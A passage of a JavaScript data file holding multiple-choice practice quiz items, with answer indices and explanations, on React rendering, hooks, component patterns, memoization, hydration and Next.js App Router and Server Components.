    { q: "What does flushSync do?", opts: ["Flushes the browser cache", "Forces React to render synchronously and update the DOM immediately, opting out of batching", "Synchronizes state between components", "Clears all pending state updates"], correct: 1, explain: "flushSync wraps setState calls that must be applied to the DOM immediately. Use when you need to read the DOM after a state update within the same function, like measuring element size after showing it." },
    { q: "What are the two phases of React rendering?", opts: ["Mount phase and update phase", "Render phase (builds virtual DOM, interruptible) and Commit phase (updates real DOM, synchronous)", "Diffing phase and patching phase", "Creation phase and execution phase"], correct: 1, explain: "Render phase: React calls component functions and builds the new virtual DOM tree — this is pure and can be interrupted in Concurrent Mode. Commit phase: React applies changes to the real DOM — always synchronous and runs to completion." },
    { q: "What triggers a React component to re-render?", opts: ["Any JavaScript execution", "State change, prop change, parent re-render, or subscribed context change", "Only direct user interaction", "Only when explicitly called"], correct: 1, explain: "A component re-renders when: its own state changes, its props change (new reference), its parent re-renders (unless React.memo), or a context it subscribes to changes. React re-renders are how the UI stays in sync with state." },
    { q: "What does useTransition do in React 18?", opts: ["Adds CSS transitions to state changes", "Marks state updates as non-urgent so React can interrupt them for urgent updates", "Delays state updates by 300ms", "Creates smooth animations"], correct: 1, explain: "useTransition marks state updates as low priority. React can interrupt these 'transition' renders to handle urgent updates (like user typing). The UI shows isPending while the transition is deferred." },
  ],

  'context-perf': [
    { q: "Why does Context cause unnecessary re-renders?", opts: ["Context is slow by design", "All consumers re-render whenever the context value reference changes, even if only unrelated fields changed", "Context uses polling to detect changes", "Context doesn't batch updates"], correct: 1, explain: "React Context re-renders ALL consumers when the value changes (by reference). If you put {user, theme, notifications} in one context and notifications changes, components that only use user also re-render." },
    { q: "What is the most effective way to prevent Context re-renders?", opts: ["Use useCallback everywhere", "Split context by concern and memoize each provider's value with useMemo", "Avoid Context entirely", "Use Redux instead"], correct: 1, explain: "Splitting Context into smaller, focused contexts means components only subscribe to what they actually use. Combined with useMemo on the value object, each context only re-renders its own consumers when relevant data changes." },
    { q: "Why does passing an object literal as context value cause issues?", opts: ["Object literals are invalid in JSX", "A new object is created on every render, so all consumers re-render even when the data hasn't changed", "Object literals don't support all data types", "It's a syntax error"], correct: 1, explain: "value={{ user, setUser }} creates a new object reference on every render. Even if user and setUser haven't changed, the new reference triggers all context consumers to re-render. Fix: useMemo(() => ({ user, setUser }), [user])." },
    { q: "What is the 'children as props' pattern for avoiding Context re-renders?", opts: ["Passing children through Redux", "Passing expensive components as children so they're owned by a parent that doesn't re-render when the count changes", "Lifting children to a separate file", "Using React.cloneElement"], correct: 1, explain: "If Parent holds count state and passes expensive Child as children, Child's props come from its OWN parent (which doesn't re-render on count change). React reuses the existing Child element — no re-render." },
    { q: "What external state libraries avoid Context re-render problems?", opts: ["They all have the same problem", "Zustand, Jotai, and Valtio — components subscribe to specific slices and only re-render when their slice changes", "Only Redux solves this", "The problem can't be solved"], correct: 1, explain: "Zustand, Jotai, and other signal/atom-based libraries use a subscription model where each component subscribes to exactly the state it needs. They bypass React Context entirely, avoiding the 'all consumers re-render' problem." },
  ],

  'custom-hooks': [
    { q: "What is a custom hook?", opts: ["A hook built into React", "A JavaScript function starting with 'use' that can call other hooks and encapsulates reusable stateful logic", "An event handler", "A React class method"], correct: 1, explain: "A custom hook is any function starting with 'use' that calls React hooks internally. The 'use' prefix is a convention that tells React (and linting tools) this function follows the rules of hooks." },
    { q: "Why must custom hooks start with 'use'?", opts: ["JavaScript requires it", "React's lint rules (react-hooks/rules-of-hooks) use it to enforce the rules of hooks within that function", "It's just a convention with no technical reason", "It enables TypeScript type inference"], correct: 1, explain: "The 'use' prefix signals to React's ESLint plugin that this function must follow the rules of hooks (not called conditionally, not inside loops, etc.). Without it, React can't enforce these rules inside the function." },
    { q: "What is the benefit of custom hooks over utility functions?", opts: ["Custom hooks are faster", "Custom hooks can contain state and side effects — utility functions cannot use React hooks", "Custom hooks have better TypeScript support", "Custom hooks are tree-shakable"], correct: 1, explain: "Regular utility functions can't use useState, useEffect, etc. Custom hooks can contain any hook logic, making them perfect for encapsulating complex stateful behavior like data fetching, subscriptions, or browser API integration." },
    { q: "In useFetch, why do we pass url as a dependency to useEffect?", opts: ["Just for documentation", "So the effect re-runs and fetches new data whenever the URL changes", "To prevent infinite loops", "It's required by the React team"], correct: 1, explain: "If url changes (e.g., user navigates to different profile), we want to fetch the new URL's data. Adding url to deps ensures useEffect re-runs. The cleanup function also aborts the previous fetch before starting the new one." },
    { q: "Should a custom hook's returned callback functions be wrapped in useCallback?", opts: ["Never — it's premature optimization", "Yes, when the hook is designed for reuse — unstable references prevent consumers from safely using the functions in dependency arrays", "Only for async functions", "Only when the function is expensive"], correct: 1, explain: "If your hook returns functions and consumers need to put them in dependency arrays (useEffect deps, useMemo deps), those functions must be stable (useCallback). Otherwise consumers get infinite loops or incorrect memoization." },
  ],

  'state-management': [
    { q: "What is the difference between server state and client state?", opts: ["Server state is more important", "Server state is data from APIs (async, can be stale); client state is local UI state (menus, forms, selections)", "Server state is stored in localStorage", "They are the same thing managed differently"], correct: 1, explain: "Server state (from APIs) has different characteristics: it's async, can become stale, needs caching and revalidation. React Query/SWR are designed for it. Client state (UI state) is synchronous and owned by the app — Context or Zustand." },
    { q: "When should you use useReducer over useState?", opts: ["Always — useReducer is better", "When state has complex update logic, multiple sub-values, or when next state depends on the previous in non-trivial ways", "Only for global state", "When you need Redux-like behavior"], correct: 1, explain: "useReducer shines for complex state objects with multiple update types, when state transitions are non-trivial, or when you want to express state changes as explicit action objects for clarity and testability." },
    { q: "What is 'derived state' anti-pattern?", opts: ["Using CSS variables", "Storing computed values in state that could be calculated from existing state during render", "Having state in child components", "Using multiple useState calls"], correct: 1, explain: "Derived state anti-pattern: const [fullName, setFullName] = useState(firstName + ' ' + lastName). fullName is just firstName + lastName — storing it creates a sync bug (what if firstName changes?). Just compute it during render." },
    { q: "What problem does React Query solve that useState doesn't?", opts: ["Component re-renders", "Caching, deduplication, background revalidation, stale-while-revalidate, optimistic updates — server state concerns useState ignores", "Form validation", "Global state sharing"], correct: 1, explain: "useState for fetched data means: no caching (refetch on every mount), no deduplication (same endpoint called multiple times), no background refresh, no stale handling. React Query solves all of these out of the box." },
    { q: "What is Zustand's advantage over Context for global state?", opts: ["Zustand is easier to set up", "Components subscribe to specific state slices — only re-render when their specific slice changes, not the entire store", "Zustand has more features", "Zustand works without React"], correct: 1, explain: "Context re-renders all consumers on any value change. Zustand uses a subscription model: useStore(state => state.count) only re-renders when count changes. Other state changes in the store don't trigger a re-render." },
  ],

  'hoc-pattern': [
    { q: "What is a Higher-Order Component (HOC)?", opts: ["A component with many props", "A function that takes a component and returns a new enhanced component", "React's built-in component optimization", "A component that renders other components"], correct: 1, explain: "A HOC is a function: Component => EnhancedComponent. It wraps a component to add behavior (auth checking, logging, data fetching) without modifying the original component. Pattern borrowed from higher-order functions." },
    { q: "What is the main drawback of HOCs compared to hooks?", opts: ["HOCs are slower", "HOCs create wrapper component nesting (wrapper hell), make debugging harder, and can cause prop name collisions", "HOCs don't support TypeScript", "HOCs only work with class components"], correct: 1, explain: "Multiple HOCs create deeply nested component trees ('wrapper hell'). DevTools shows MyComp wrapped in WithAuth(WithLogging(WithTheme(MyComp))). Props can collide. Hooks solve the same problems with flatter composition." },
    { q: "Why should HOCs forward refs?", opts: ["For performance", "HOCs wrap components, so refs point to the wrapper. forwardRef passes refs through to the actual component", "TypeScript requires it", "HOCs don't support refs otherwise"], correct: 1, explain: "When a HOC wraps a component, ref={inputRef} attaches to the HOC's wrapper div, not the inner component. React.forwardRef solves this by explicitly passing the ref through to the underlying component." },
    { q: "What React feature has largely replaced HOCs?", opts: ["Class components", "Custom hooks — they share logic without creating new component layers", "Context API", "React.memo"], correct: 1, explain: "Custom hooks replaced HOCs for logic reuse. useAuth(), useLogger(), useTheme() hooks compose flat without nesting. The same reusable logic, without wrapper components in the tree." },
    { q: "What must a HOC do to follow best practices?", opts: ["Always use Class components", "Pass through all props with {...props}, forward refs, and use displayName for debugging", "Return a memoized component always", "Use Redux internally"], correct: 1, explain: "Best practices: spread all props to wrapped component (don't intercept unless needed), forward refs, set displayName ('WithAuth(Button)') for React DevTools, and don't mutate the wrapped component." },
  ],

  'render-props': [
    { q: "What is the render props pattern?", opts: ["Rendering component properties as strings", "Sharing logic by passing a function as a prop that a component calls to determine what to render", "A performance optimization technique", "Rendering the same component multiple times"], correct: 1, explain: "Render props: a component accepts a function prop (often called render or children) and calls it to know what to render. <DataFetcher render={data => <Chart data={data} />} /> — the logic lives in DataFetcher, the UI in the function." },
    { q: "What is the 'children as function' variant of render props?", opts: ["Passing children as a string", "<Comp>{(data) => <div>{data}</div>}</Comp> — using children as the render function instead of a named prop", "Creating child components dynamically", "Using React.children API"], correct: 1, explain: "Instead of render={fn}, use children={fn}: <Mouse>{(pos) => <div style={{left:pos.x}}>●</div>}</Mouse>. The component calls this.props.children(pos). It's the same pattern — different prop name." },
    { q: "What performance issue do render props have?", opts: ["They are always slow", "The render function is a new function reference on every parent render, causing the consumer to always re-render", "They cause memory leaks", "They don't work with PureComponent"], correct: 1, explain: "If render={() => <Child />} is inline, it creates a new function reference on every parent render. If the consuming component is a PureComponent, it still re-renders because the render prop always looks different." },
    { q: "Which pattern has mostly replaced render props?", opts: ["Class components", "Custom hooks — same logic reuse without the JSX complexity", "HOCs", "Context API"], correct: 1, explain: "Custom hooks provide the same logic reuse as render props with simpler code. Instead of <Mouse render={pos => ...}/>, use const pos = useMouse(). No JSX nesting, cleaner composition." },
  ],

  'compound-components': [
    { q: "What is the Compound Components pattern?", opts: ["Multiple components on the same page", "Components that work together and share implicit state via Context, creating expressive APIs like <Select><Option /></Select>", "Components that inherit from each other", "Components with many props"], correct: 1, explain: "Compound components are a group of components designed to work together. The parent manages state via Context; child components consume it. Like HTML's <select>/<option> — children don't receive props explicitly but access shared state." },
    { q: "How does Compound Components share state between parent and children?", opts: ["Through prop drilling", "Via React Context — parent provides state, children consume it via useContext", "Via Redux", "Via global variables"], correct: 1, explain: "The parent component creates a Context with its state and provides it. Each child component (Option, Item, Trigger, Content) consumes the context via useContext — no prop drilling required." },
    { q: "What is the benefit of Compound Components over a single prop-heavy component?", opts: ["Better performance", "More flexible, expressive API — consumers arrange children as they like instead of configuring everything via props", "Smaller bundle size", "Better TypeScript support"], correct: 1, explain: "Compare: <Modal title='...' footer={<>...</>} content={<>...</>} /> vs <Modal><Modal.Header>...</Modal.Header><Modal.Body>...</Modal.Body></Modal>. The latter is more flexible, readable, and allows reordering or omitting parts." },
    { q: "What problem does the dot notation convention solve?", opts: ["CSS naming", "<Tabs.Tab> and <Tabs.Panel> make it clear these components belong to Tabs and shouldn't be used standalone", "Performance optimization", "Module loading"], correct: 1, explain: "Dot notation (Tabs.Tab, Select.Option, Modal.Header) signals that these components are part of a compound component family and should be used together. It's achieved by: Tabs.Tab = Tab; Tabs.Panel = Panel; export default Tabs;" },
  ],

  'controlled-uncontrolled': [
    { q: "What is a controlled component in React?", opts: ["A component controlled by CSS", "A form input whose value is controlled by React state — React is the single source of truth", "A component that can't be re-rendered", "A component with no props"], correct: 1, explain: "Controlled: value={state} onChange={setState}. React state drives the input value. Every keystroke calls onChange, which updates state, which updates the input. React is always in sync with the DOM." },
    { q: "What is an uncontrolled component?", opts: ["A broken component", "An input that manages its own state in the DOM — accessed via ref, not React state", "A component without any props", "A component outside React's tree"], correct: 1, explain: "Uncontrolled: no value prop, no onChange. The DOM manages the value. Access it via ref.current.value. Simpler for simple forms, but React doesn't know the value on every keystroke." },
    { q: "When should you use uncontrolled components?", opts: ["Never — controlled is always better", "For file inputs (always uncontrolled), simple forms needing values only on submit, or integrating with non-React libraries", "For complex validation", "When performance is critical"], correct: 1, explain: "File inputs are always uncontrolled — you can't set their value programmatically. Simple forms that only need the value on submit benefit from uncontrolled (less re-renders). useRef + FormData is often cleaner for simple cases." },
    { q: "What is the difference between defaultValue and value in React?", opts: ["They are identical", "defaultValue sets initial value for uncontrolled inputs; value creates a controlled input and must be updated via onChange", "defaultValue is for class components only", "value is read-only"], correct: 1, explain: "value={x} makes the input controlled — React manages it. Setting value without onChange makes it read-only. defaultValue={x} sets the initial value for uncontrolled inputs — React doesn't track subsequent changes." },
  ],

  'error-boundaries': [
    { q: "What do Error Boundaries catch?", opts: ["All JavaScript errors everywhere", "Errors during rendering, lifecycle methods, and constructors of child components — NOT event handlers or async code", "Network request failures", "Syntax errors"], correct: 1, explain: "Error Boundaries catch errors in: render, lifecycle methods, constructors of child components. They do NOT catch: event handlers (use try/catch), async code (use .catch), server-side rendering errors, or errors in the boundary itself." },
    { q: "How do you create an Error Boundary?", opts: ["Use the useErrorBoundary hook", "Create a class component implementing static getDerivedStateFromError() and/or componentDidCatch()", "Wrap components in <ErrorBoundary>", "Use try/catch in the render method"], correct: 1, explain: "Error Boundaries must be class components (no hook equivalent yet). Implement getDerivedStateFromError(error) to render fallback UI, and componentDidCatch(error, info) to log errors. Popular library: react-error-boundary." },
    { q: "Why can't Error Boundaries catch errors in event handlers?", opts: ["React decided not to support it", "Event handlers don't run during rendering — errors there don't affect the render output, so use regular try/catch", "It's technically impossible", "Event handler errors crash the entire app"], correct: 1, explain: "Error Boundaries catch rendering errors because React needs to unmount and show fallback UI when rendering fails. Event handlers run outside the render cycle — their errors don't break rendering, so use regular try/catch." },
    { q: "What is the recommended library for Error Boundaries in modern React?", opts: ["react-catch", "react-error-boundary — provides useErrorBoundary hook and withErrorBoundary HOC", "React includes a built-in ErrorBoundary component", "error-boundary-react"], correct: 1, explain: "react-error-boundary by Brian Vaughn provides a ready-to-use ErrorBoundary component, withErrorBoundary HOC, and the useErrorBoundary hook that lets functional components interact with the nearest error boundary." },
  ],

  'portals-pattern': [
    { q: "What is a React Portal?", opts: ["A way to share state between apps", "Rendering a component's children into a different DOM node than its parent component's DOM tree", "A type of Context", "An async rendering technique"], correct: 1, explain: "ReactDOM.createPortal(children, domNode) renders children into domNode regardless of where the component is in the React tree. The component is still in the React tree (events bubble normally) but in a different DOM location." },
    { q: "What are the main use cases for React Portals?", opts: ["Performance optimization", "Modals, tooltips, dropdowns, toasts — anything that needs to visually escape overflow:hidden or z-index constraints of parent containers", "Server-side rendering", "Code splitting"], correct: 1, explain: "Portals solve the z-index/overflow problem. A modal inside <div style={{overflow:hidden}}> would be clipped. Portaling to document.body means it renders above all other content regardless of parent CSS constraints." },
    { q: "Do event handlers bubble through Portals in the React tree?", opts: ["No — events stop at the portal boundary", "Yes — events bubble up through the React component tree, not the DOM tree", "Only click events bubble", "Events must be handled at document level"], correct: 1, explain: "Events bubble through the React component tree regardless of DOM position. A click inside a portal modal will bubble up to the parent component that rendered the portal — useful for catching events at the React tree level." },
    { q: "How do you create a portal?", opts: ["<Portal to='#modal-root'>", "ReactDOM.createPortal(children, document.getElementById('modal-root'))", "usePortal(document.body)", "React.portal(children, '#modal')"], correct: 1, explain: "ReactDOM.createPortal(children, container) takes the JSX to render and the target DOM node. Returns a portal that can be returned from render(). The container must exist in the actual DOM." },
  ],

  'suspense-pattern': [
    { q: "What does React Suspense do?", opts: ["Delays component mounting by 300ms", "Shows a fallback UI while waiting for lazy-loaded code or async data to be ready", "Prevents flickering on fast connections", "Batches state updates"], correct: 1, explain: "Suspense catches components that 'suspend' (throw a Promise) and shows the fallback until they're ready. Used with React.lazy for code splitting and data fetching libraries that support Suspense." },
    { q: "What is React.lazy() used for?", opts: ["Making components render lazily after scroll", "Dynamically importing a component — it only downloads the code when the component first renders", "Deferring expensive computations", "Lazy evaluation of props"], correct: 1, explain: "React.lazy(() => import('./Component')) creates a lazy component. The bundle for that component isn't downloaded until it's first rendered. Wrap in <Suspense fallback={<Loading />}> to handle the loading state." },
    { q: "Where should Suspense boundaries be placed?", opts: ["Only at the root level", "Strategically near components that might suspend — granular placement gives better loading UX", "Around every component", "Only around routes"], correct: 1, explain: "Place Suspense boundaries where you want to show fallback UI. Too high = large area shows spinner. Too low = many small spinners. The right granularity depends on the UX — typically route-level and component-level boundaries." },
    { q: "What does useDeferredValue do?", opts: ["Defers a value to the next render cycle", "Returns a deferred copy of a value that may lag behind — useful for keeping UI responsive while expensive work happens", "Caches a value between renders", "Similar to useRef for values"], correct: 1, explain: "useDeferredValue(value) returns a version of value that defers to lower priority. The UI can render with stale deferred value while urgent work (typing) happens, then update. Similar to debounce but integrated with React's scheduler." },
  ],

  'forward-ref': [
    { q: "Why is forwardRef needed?", opts: ["For performance optimization", "ref props are special in React — forwardRef allows a component to pass a ref received from its parent down to a DOM element or child component", "To create controlled components", "For TypeScript support"], correct: 1, explain: "In React, ref is not a prop — you can't do <MyInput ref={inputRef} /> without forwardRef. The ref doesn't get passed through to the input automatically. forwardRef explicitly receives and forwards the ref." },
    { q: "What is useImperativeHandle used with?", opts: ["useState", "forwardRef — it customizes what the parent sees when they use the ref, exposing only specific methods instead of the full DOM node", "useEffect", "useContext"], correct: 1, explain: "useImperativeHandle(ref, () => ({ focus, scrollIntoView })) lets you expose a custom API via ref instead of the raw DOM node. Combined with forwardRef, parents can call ref.current.focus() without accessing the DOM directly." },
    { q: "What does forwardRef return?", opts: ["A HOC", "A new component that accepts ref as its second parameter (after props)", "A hook", "A class component"], correct: 1, explain: "React.forwardRef((props, ref) => <input ref={ref} {...props} />) creates a component where the ref is passed as the second argument (in addition to props). This lets the component attach the ref to whatever it needs." },
    { q: "When should you use useImperativeHandle instead of exposing the DOM ref directly?", opts: ["Always", "When you want to limit what the parent can do — expose focus/scroll methods without giving full DOM access, or expose component-level methods", "Never — just use DOM refs", "Only in TypeScript"], correct: 1, explain: "Exposing raw DOM nodes gives parents too much power and couples them to your implementation. useImperativeHandle creates a stable API: expose focus() now, later change the underlying DOM structure without breaking the parent." },
  ],

  'memo-patterns': [
    { q: "What does React.memo do?", opts: ["Memoizes the component's return value forever", "Wraps a component so it only re-renders when its props change (shallow comparison)", "Prevents any re-renders", "Memoizes expensive calculations inside the component"], correct: 1, explain: "React.memo is a HOC that does a shallow comparison of props. If props haven't changed (same references), React skips re-rendering and reuses the last rendered output. It does NOT prevent re-renders from context changes or hooks." },
    { q: "When does React.memo FAIL to prevent re-renders?", opts: ["When used with function components", "When props contain new object/array/function references created inline on every parent render", "When the component uses useState", "React.memo always works"], correct: 1, explain: "React.memo does shallow (reference) comparison. Inline objects/functions create new references every render: config={{ color: 'red' }} or onClick={() => {}} always looks 'different'. Fix: useMemo for objects, useCallback for functions." },
    { q: "What is the difference between useMemo and useCallback?", opts: ["useMemo is for components, useCallback for functions", "useMemo memoizes a computed VALUE; useCallback memoizes a FUNCTION reference", "They are identical", "useCallback is just useMemo(() => fn, deps)"], correct: 3, explain: "useCallback(fn, deps) is exactly equivalent to useMemo(() => fn, deps). useCallback returns the memoized function itself. useMemo returns whatever the factory function returns — any value, not just functions." },
    { q: "Should you add useMemo/useCallback to every component?", opts: ["Yes — always memoize", "No — only when profiling shows a performance issue. Memoization has overhead and adds complexity", "Yes for class components, No for function components", "Only in production builds"], correct: 1, explain: "Premature memoization adds complexity and has its own overhead (comparison cost, memory). The React team recommends: profile first, identify actual bottlenecks, then memoize. Most apps don't need pervasive memoization." },
    { q: "What does the React.memo comparison function argument do?", opts: ["It's for testing", "Customizes when the component should re-render: return true = skip re-render (props 'equal'), return false = re-render", "Provides a default value", "Handles errors during comparison"], correct: 1, explain: "React.memo(Component, (prevProps, nextProps) => prevProps.id === nextProps.id) — the second arg is like shouldComponentUpdate returning false (skip render) when true. Opposite of shouldComponentUpdate's convention." },
  ],

  'rerender-causes': [
    { q: "If a parent component re-renders but passes the same props, does a child re-render?", opts: ["No — React only re-renders on prop changes", "Yes — by default, children re-render when parents re-render regardless of props", "Only if the child has state", "Only in React 18"], correct: 1, explain: "By default, when a parent re-renders, ALL its children re-render too — even if their props didn't change. React.memo is the way to opt out: it performs a shallow prop comparison and skips the render if props are unchanged." },
    { q: "What is the fastest way to check what caused a component to re-render?", opts: ["Add console.log everywhere", "React DevTools Profiler — record a session, click the component, see 'Why did this render?'", "Use Chrome Performance panel", "Add why-did-you-render library only"], correct: 1, explain: "React DevTools Profiler's 'Why did this render?' feature shows exactly which prop or state changed to cause the re-render. It's the fastest way to debug re-render issues without adding any code." },
    { q: "A component wrapped in React.memo re-renders on every parent render. What's the most likely cause?", opts: ["React.memo is broken", "A prop is a new function or object reference created inline in the parent's render (e.g., onClick={() => {}} or config={{}})", "The component has internal state", "The component uses useContext"], correct: 1, explain: "React.memo does shallow prop comparison. If onClick={() => handleClick()} is inline in JSX, a new function is created each parent render. React.memo sees a different reference each time and allows the re-render." },
    { q: "What hook makes callback functions stable across renders?", opts: ["useMemo", "useCallback — returns memoized function reference that only changes when deps change", "useRef", "useEffect"], correct: 1, explain: "useCallback(fn, [deps]) returns the same function reference as long as deps don't change. Pass it to memoized children via props and they won't re-render just because the parent re-rendered." },
    { q: "When does useSelector in Redux cause unnecessary re-renders?", opts: ["Always", "When the selector returns a new object/array reference on every call, even if the underlying data hasn't changed", "When the store updates", "When other components update"], correct: 1, explain: "state => ({ count: state.counter.count, name: state.user.name }) creates a new object each call. Redux compares the return value — new reference = re-render even if count and name are the same. Return primitives or use reselect." },
  ],

  'state-batching': [
    { q: "In React 17, where did batching NOT happen automatically?", opts: ["Event handlers", "setTimeout, Promises, and native event handlers — each setState caused a separate re-render", "useReducer updates", "Component lifecycle methods"], correct: 1, explain: "React 17 only batched updates inside React event handlers. setState inside setTimeout, Promise.then, or native addEventListener callbacks each caused a separate re-render. React 18 extended batching to all of these." },
    { q: "How do you opt out of batching in React 18 when you need a synchronous DOM update?", opts: ["ReactDOM.unmount()", "flushSync(() => setState(...))", "unstable_batchedUpdates()", "ReactDOM.flush()"], correct: 1, explain: "flushSync(() => setState(newValue)) forces React to flush the update and re-render synchronously. The DOM is updated immediately after flushSync returns. Use sparingly — mainly for integrating with non-React code." },
    { q: "What does React 18's automatic batching improve?", opts: ["Only renders inside event handlers", "Reduces unnecessary re-renders in async contexts (setTimeout, Promises, native events) by grouping multiple setState calls", "Only improves performance on mobile", "Automatic batching makes flushSync unnecessary"], correct: 1, explain: "React 18 batches all setState calls, regardless of context. Multiple setStates in a setTimeout or Promise.then are now grouped into one re-render instead of one per setState. This improves performance without any code changes." },
  ],

  'virtualization': [
    { q: "What is list virtualization?", opts: ["Converting lists to virtual DOM", "Only rendering items visible in the viewport, not all items in the list", "Caching list items in memory", "Using CSS to hide off-screen items"], correct: 1, explain: "Virtualization (windowing) only renders DOM nodes for visible items plus a small buffer. A list of 100,000 items only has ~20-30 DOM nodes at any time. This makes rendering fast regardless of total list size." },
    { q: "What are popular React virtualization libraries?", opts: ["react-virtual-list", "TanStack Virtual (react-virtual) and react-window — both implement windowing for large lists", "react-paginate", "react-infinite-scroll"], correct: 1, explain: "TanStack Virtual (formerly react-virtual) is the modern choice — flexible, headless, works with dynamic heights. react-window is older but battle-tested. Both use the same principle: only render visible rows." },
    { q: "What CSS technique makes virtualization work?", opts: ["display: none for hidden items", "Position items absolutely with top = index * itemHeight inside a container with the total height", "overflow: hidden on the container", "transform: translateY for each item"], correct: 1, explain: "The container has height = totalItems * itemHeight (so the scrollbar is correct). Visible items are positioned absolutely with top = index * itemHeight. As you scroll, the items move to the correct position within the visible window." },
    { q: "What is the 'overscan' concept in virtualization?", opts: ["Rendering extra pixels", "Rendering a few extra items beyond the visible area to prevent blank flashes during fast scrolling", "Overriding the scroll behavior", "Pre-fetching data for upcoming items"], correct: 1, explain: "Overscan renders a few extra items above and below the visible area. Without it, very fast scrolling can outpace rendering and show blank areas. Typical overscan is 3-5 items in each direction." },
  ],

  'concurrent-features': [
    { q: "What is the purpose of useTransition?", opts: ["Adding CSS transitions", "Marking state updates as non-urgent — React can interrupt them for higher priority updates like user input", "Delaying API calls", "Creating animated state changes"], correct: 1, explain: "useTransition returns [isPending, startTransition]. Wrap non-urgent updates in startTransition(() => setState(...)). React prioritizes urgent work (typing) over the transition work, which can be deferred or interrupted." },
    { q: "What is useDeferredValue similar to?", opts: ["useCallback", "A debounce — returns a lagging copy of a value that updates when React has time, keeping the UI responsive", "useRef", "useEffect"], correct: 1, explain: "useDeferredValue(value) is like a React-aware debounce. The deferred value lags behind the real value during high-priority renders. Use it to show stale search results while computing new ones, keeping the input responsive." },
    { q: "What does Concurrent Mode enable that Sync Mode doesn't?", opts: ["Multiple render roots", "Interruptible rendering — React can pause, resume, or discard work based on priority", "WebWorker rendering", "Server-side rendering"], correct: 1, explain: "Concurrent Mode (the default in React 18 with createRoot) makes rendering interruptible. React can pause a low-priority render to handle a high-priority update (user interaction), then resume where it left off." },
    { q: "What does the isPending flag from useTransition tell you?", opts: ["If a network request is in progress", "That a transition render is in progress — useful for showing a loading indicator while results update", "If the component is mounted", "If React DevTools is connected"], correct: 1, explain: "isPending is true while React is computing the deferred transition update. Show a subtle loading indicator (opacity change, spinner) while it's pending to signal that results are updating, but without freezing input." },
  ],

  'hydration-issues': [
    { q: "What is hydration in React?", opts: ["Adding water to data", "React attaching event listeners to server-rendered HTML, making it interactive", "Loading CSS styles", "Fetching initial data"], correct: 1, explain: "Hydration is the process of React taking server-rendered static HTML and attaching event listeners and React state to it. React 'hydrates' the existing DOM rather than creating it from scratch." },
    { q: "What causes a hydration mismatch error?", opts: ["Using useState in SSR", "The server-rendered HTML doesn't match what React would render on the client (different content, conditional rendering based on window, dates)", "Network errors during SSR", "Missing CSS classes"], correct: 1, explain: "Hydration mismatch: server renders <div>Server content</div> but client renders <div>Client content</div>. Common causes: Date.now(), Math.random(), window checks, browser-only APIs, or CSS-in-JS class generation differences." },
    { q: "How do you fix hydration mismatches from browser-only code?", opts: ["Remove the server-side rendering", "Use useEffect for browser-only rendering, or dynamic import with ssr:false in Next.js", "Use suppressHydrationWarning on every element", "Use client-side only rendering"], correct: 1, explain: "For browser-only components (window, localStorage, canvas): use useEffect to run them after mount, or in Next.js use dynamic(() => import('./BrowserOnlyComp'), { ssr: false }). suppressHydrationWarning is a last resort." },
    { q: "When is suppressHydrationWarning appropriate?", opts: ["Always for SSR components", "For elements with intentionally different server/client content (timestamps, user-specific data) where mismatch is expected and acceptable", "Never — always fix mismatches", "Only for input elements"], correct: 1, explain: "suppressHydrationWarning={true} tells React to not warn about mismatches for that element. Appropriate for timestamps (server renders '2024-01-01', client renders 'Today'), but overusing it masks real bugs." },
  ],

  'app-router': [
    { q: "What is the default rendering model in Next.js App Router?", opts: ["Client-side rendering", "Server Components — components render on the server with zero JavaScript shipped to the client by default", "Static generation", "Edge rendering"], correct: 1, explain: "In App Router, every component is a Server Component by default. They render on the server, have access to databases/secrets directly, and send zero JS to the client. Add 'use client' to opt into client-side rendering." },
    { q: "When do you need 'use client' in Next.js App Router?", opts: ["For every component", "When a component uses React hooks, browser APIs, event listeners, or needs to be interactive", "For data fetching", "For styling with CSS modules"], correct: 1, explain: "'use client' marks a component as a Client Component. Required when using: useState, useEffect, onClick, onChange, browser APIs (window, localStorage), or any hooks that depend on client state." },
    { q: "What is a key advantage of Server Components over Client Components?", opts: ["They're faster to write", "Zero bundle size impact, direct database/filesystem access, access to server secrets, no hydration needed", "Better TypeScript support", "They work offline"], correct: 1, explain: "Server Components render on the server and stream HTML — no JavaScript is shipped for them. They can access databases, file systems, and environment variables directly. The result is smaller bundle sizes and faster initial loads." },
    { q: "What file convention creates a loading UI in App Router?", opts: ["loading.js in any route segment — automatically wrapped in Suspense for that route segment", "Loading.jsx at root", "_loading.js", "page.loading.js"], correct: 0, explain: "loading.js (or .tsx) in a route segment automatically wraps that segment's page in a Suspense boundary and shows while the page is loading. It's a convention-based Suspense boundary." },
    { q: "How do layouts work differently in App Router vs Pages Router?", opts: ["They don't differ", "App Router layouts persist across navigation (preserve state), Pages Router's _app.js re-renders on every navigation", "App Router has no layouts", "Pages Router layouts are static"], correct: 1, explain: "App Router's layout.js creates persistent layouts that don't unmount between navigations. State in layouts (sidebar scroll, form inputs) is preserved. Pages Router's _app.js/Layout components re-mount on navigation." },
  ],

  'server-components': [
    { q: "What is a React Server Component?", opts: ["A component that makes API calls", "A component that renders exclusively on the server with access to server resources, shipping zero JavaScript to the client", "An Express.js component", "A component that loads data server-side only"], correct: 1, explain: "RSCs render on the server, can access databases/files/secrets directly, and their output is streamed as HTML. They ship zero JavaScript to the browser — no hydration needed for them." },
    { q: "Can Server Components use useState or useEffect?", opts: ["Yes, all hooks work", "No — they're async functions without React state or effects. Use Client Components for interactivity", "Only useEffect works", "Only useState works"], correct: 1, explain: "Server Components are async functions that run once on the server. They have no client state, no lifecycle, no hooks. For interactivity, use Client Components (with 'use client') nested inside Server Components." },
    { q: "Can you import a Client Component inside a Server Component?", opts: ["No", "Yes — Server Components can render Client Components. But Client Components cannot render Server Components (only pass them as props/children)", "Only in App Router", "Only with dynamic imports"], correct: 1, explain: "Server Components can import and render Client Components. The Server Component renders on server, the Client Component hydrates on the client. But a Client Component can't import a Server Component — it would include server-only code in the bundle." },
    { q: "What is the primary benefit of Server Components for performance?", opts: ["Faster JavaScript execution", "Zero JavaScript shipped for Server Components — reduces bundle size and eliminates hydration cost for static content", "Better caching", "Smaller HTML payload"], correct: 1, explain: "Server Components produce zero client-side JavaScript. A page heavy with Server Components has a dramatically smaller bundle size and faster TTI. Only interactive Client Components contribute to the JS bundle." },
  ],

  'nextjs-caching': [
    { q: "How many caching layers does Next.js App Router have?", opts: ["1", "4 — Request Memoization, Data Cache, Full Route Cache, Router Cache", "2", "Unlimited"], correct: 1, explain: "Next.js has 4 distinct caches: Request Memoization (dedupes fetch in one render), Data Cache (persistent across requests), Full Route Cache (stores rendered HTML/RSC payload), Router Cache (client-side navigation cache)." },
